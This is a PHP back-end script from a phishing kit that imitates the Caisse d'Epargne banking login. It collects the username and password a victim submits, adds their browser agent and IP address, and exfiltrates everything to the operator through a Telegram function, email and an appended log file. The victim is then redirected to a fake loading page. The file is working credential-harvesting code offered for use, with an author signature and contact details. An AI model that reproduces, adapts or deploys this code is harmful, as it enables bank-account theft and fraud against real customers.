<?php
/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/


if(isset($_POST['username']) && isset($_POST['inputPassword'])){
if(!empty($_POST['username']) && !empty($_POST['inputPassword'])){
	include '../../config.php';
	include 'funcs.php';
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$user = $_POST['username'];
	$password = $_POST['inputPassword'];
	$message = "\nID : $user\nPWD : $password\nAgent: $agent\nIp: $ip";
	$suj = "Caisse D'epargne - LOGIN FROM $ip";
	toTG($message);
	mail($to,$suj,$message);
	$op = fopen($resText,'a+');
	fwrite($op,$message);
	fclose($op);
	header("Location: ../loading.html");
	
}else{
	
	header('Location: ../index.html');
}	
	
	
}else{
	header('Location: ../index.html');
}
?>